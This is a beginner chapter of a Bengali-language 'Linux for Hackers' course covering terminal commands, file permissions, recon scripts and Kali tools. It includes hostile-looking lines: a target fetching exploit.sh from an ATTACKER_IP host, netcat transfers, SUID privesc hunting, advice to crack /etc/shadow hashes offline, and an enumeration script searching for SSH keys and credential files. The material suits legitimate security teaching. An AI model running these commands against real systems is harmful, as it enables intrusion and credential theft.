---
title: 'Linux for Hackers'
subtitle: 'টার্মিনাল দক্ষতা, ফাইল পারমিশন, bash স্ক্রিপ্টিং, এবং Kali Linux-এ যেসব টুল আসে।'
chapter: 2
level: 'beginner'
readingTime: '10 মিনিট'
topics: ['linux', 'bash', 'kali', 'terminal', 'file permissions', 'processes']
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**বাস্তব জীবনের উদাহরণ**

যে সার্জন অ্যানাটমি জানেন না, তিনি অপারেশন করতে পারেন না। Linux হলো হ্যাকিং-এর অ্যানাটমি — প্রতিটি টুল, প্রতিটি exploit স্ক্রিপ্ট, প্রতিটি automated scanner এর ওপরেই চলে। আপনাকে Linux অ্যাডমিন হতে হবে না, কিন্তু রিফ্লেক্সিভ command-line দক্ষতা থাকতে হবে।

</Callout>

## অপরিহার্য কমান্ড

```bash
# Navigation
pwd                    # where am I
ls -la                 # list all files including hidden, with permissions
cd /etc                # change directory
find / -name "*.conf"  # find config files
locate passwd          # fast file search (uses index)

# File operations
cat /etc/passwd        # view file
less /var/log/auth.log # page through a large file
grep "Failed" /var/log/auth.log  # search within file
grep -r "password" /var/www/     # recursive search
tail -f /var/log/syslog          # follow log in real-time

# Process info
ps aux                 # all running processes
ps aux | grep nginx    # find specific process
top                    # interactive process monitor
kill 1234              # kill process by PID
kill -9 1234           # force kill
```

## ফাইল পারমিশন — সিকিউরিটির ভিত্তি

```bash
ls -la /etc/shadow
# -rw-r----- 1 root shadow 1234 Jan 1 00:00 /etc/shadow
#  ↑↑↑↑↑↑↑↑↑
#  │││││││││
#  ││││││└└└─ other: --- (no permissions)
#  │││└└└──── group (shadow): r-- (read only)
#  └└└──────── owner (root): rw- (read+write)
```

**Octal শর্টহ্যান্ড:**

```
r = 4, w = 2, x = 1
rwx = 7 (4+2+1)
rw- = 6 (4+2)
r-- = 4

chmod 755 file   → rwxr-xr-x  (owner: all, group: read+exec, other: read+exec)
chmod 644 file   → rw-r--r--  (owner: read+write, rest: read)
chmod 600 file   → rw-------  (owner only)
```

**SUID bit — একটি সাধারণ privilege escalation vector:**

```bash
# SUID: file runs as owner (often root) regardless of who executes it
chmod u+s /usr/bin/somebinary
ls -la /usr/bin/somebinary
# -rwsr-xr-x  ← the 's' means SUID is set

# Find all SUID binaries on a system (privesc hunting)
find / -perm -4000 -type f 2>/dev/null
```

যদি কোনো SUID binary writable, misconfigured, বা এর কোনো known vulnerability থাকে, তবে এটি একটি privesc path।

## Users, Groups, এবং /etc/passwd

```bash
cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# ───┬─ ─ ┬ ┬ ──┬─ ───┬─ ──────┬─
#    │     │ │   │     │        └── login shell
#    │     │ │   │     └────────── home directory
#    │     │ │   └──────────────── GECOS (display name)
#    │     │ └──────────────────── primary group ID
#    │     └────────────────────── user ID (0 = root)
#    └──────────────────────────── username

# Password hashes live in /etc/shadow (root-readable only)
sudo cat /etc/shadow
# root:$6$salt$hash...:18000:0:99999:7:::
#      ↑ $6$ = SHA-512 (modern), $1$ = MD5 (old, weak)
```

যখন আপনি `/etc/shadow`-এ read access পাবেন, hash গুলো বের করে অফলাইনে crack করুন।

## Networking কমান্ড

```bash
# Interface info
ip addr show
ifconfig             # older systems

# Routing table
ip route show
route -n

# Active connections
ss -tulnp            # TCP+UDP, listening, numeric, with process
netstat -tulnp       # older alternative

# DNS resolution
nslookup example.com
dig example.com
dig example.com MX   # mail records
dig example.com ANY  # all record types

# Connectivity
ping -c 4 192.168.1.1
curl -I https://example.com   # HTTP headers only
wget -O - https://example.com/file  # download to stdout
```

## রিকনের জন্য Bash স্ক্রিপ্টিং

```bash
#!/bin/bash
# Ping sweep — find live hosts

TARGET="192.168.1"
echo "[*] Scanning $TARGET.0/24..."

for i in $(seq 1 254); do
  (ping -c 1 -W 1 "$TARGET.$i" > /dev/null 2>&1 && echo "[+] $TARGET.$i is up") &
done
wait
echo "[*] Done"
```

```bash
#!/bin/bash
# Port knock — check common ports on a host

HOST=$1
PORTS=(21 22 23 25 53 80 443 445 3306 3389 5432 6379 8080 9200)

for port in "${PORTS[@]}"; do
  (echo > /dev/tcp/$HOST/$port) 2>/dev/null && echo "OPEN: $port" || echo "closed: $port"
done
```

```bash
#!/bin/bash
# Extract URLs from a web page

URL=$1
curl -s "$URL" | grep -oP 'href="[^"]*"' | sed 's/href="//;s/"//' | sort -u
```

## Kali Linux টুলের অবস্থান

```bash
/usr/share/wordlists/           # password lists
/usr/share/wordlists/rockyou.txt.gz  # most common password list (gunzip first)
/usr/share/nmap/scripts/        # nmap NSE scripts
/usr/share/metasploit-framework/modules/  # Metasploit modules
/usr/share/exploitdb/           # offline copy of exploit-db

# Update tools
sudo apt update && sudo apt upgrade
sudo apt install gobuster feroxbuster  # install additional tools
```

## টেক্সট প্রসেসিং (grep, awk, sed)

```bash
# Extract IP addresses from a log file
grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' access.log | sort | uniq -c | sort -rn

# Find lines with HTTP 200 responses containing /admin
grep "200.*\/admin" access.log

# Extract usernames from /etc/passwd
awk -F: '{print $1}' /etc/passwd

# Replace string in file
sed -i 's/old_string/new_string/g' file.txt

# Get columns from CSV
cut -d, -f1,3 users.csv

# Count unique IPs
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
```

## tmux — মাল্টি-উইন্ডো টার্মিনাল

একসাথে একাধিক টুল চালানোর (এক pane-এ scanner, আরেকটায় exploit, তৃতীয়টায় notes) জন্য tmux দরকার:

```bash
# Start session
tmux new -s pentest

# Key bindings (prefix = Ctrl+B)
Ctrl+B c     # new window
Ctrl+B %     # split vertical
Ctrl+B "     # split horizontal
Ctrl+B arrow # move between panes
Ctrl+B d     # detach (session keeps running)

# Reattach
tmux attach -t pentest

# Log everything in a pane
Ctrl+B :
pipe-pane -o "cat >> ~/pentest-session.log"
```

## ফাইল ট্রান্সফার টেকনিক

অ্যাটাকার ও টার্গেট মেশিনের মধ্যে ফাইল আনা-নেওয়া:

```bash
# Python HTTP server (serve files from current dir)
python3 -m http.server 8000

# On target — download file
wget http://ATTACKER_IP:8000/exploit.sh
curl http://ATTACKER_IP:8000/exploit.sh -o exploit.sh

# SCP (if SSH is available)
scp file.txt user@192.168.1.100:/tmp/

# Netcat file transfer
# Receiver:
nc -lvnp 4444 > received_file
# Sender:
nc 192.168.1.100 4444 < file_to_send

# Base64 encode/decode (for restricted environments)
base64 file.bin > file.b64
cat file.b64 | base64 -d > file.bin
```

## Environment Variables

অ্যাটাকাররা প্রায়ই misconfigured environment variable-এর অপব্যবহার করে:

```bash
# View all env vars
env
printenv

# PATH hijacking: if PATH includes writable dirs before /usr/bin,
# a malicious 'ls' or 'python' binary in that dir runs as root via sudo
echo $PATH
# /home/user/bin:/usr/local/bin:/usr/bin   ← /home/user/bin is writable!
```

## প্র্যাকটিক্যাল ল্যাব: একটি Linux সিস্টেম Enumerate করুন

Initial access পাওয়ার পর অ্যাটাকার যা করে তা সিমুলেট করতে যেকোনো Linux VM-এ এটি চালান:

```bash
#!/bin/bash
echo "=== SYSTEM INFO ==="
uname -a
cat /etc/os-release

echo "=== CURRENT USER ==="
id
whoami
sudo -l  # what can this user run as root?

echo "=== NETWORK ==="
ip addr show
ss -tulnp

echo "=== INTERESTING FILES ==="
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name "id_rsa" 2>/dev/null        # SSH private keys
find / -name ".env" 2>/dev/null           # env files with secrets
find / -name "wp-config.php" 2>/dev/null  # WordPress creds

echo "=== SUID BINARIES ==="
find / -perm -4000 -type f 2>/dev/null

echo "=== CRON JOBS ==="
cat /etc/crontab
ls /etc/cron.d/
crontab -l
```
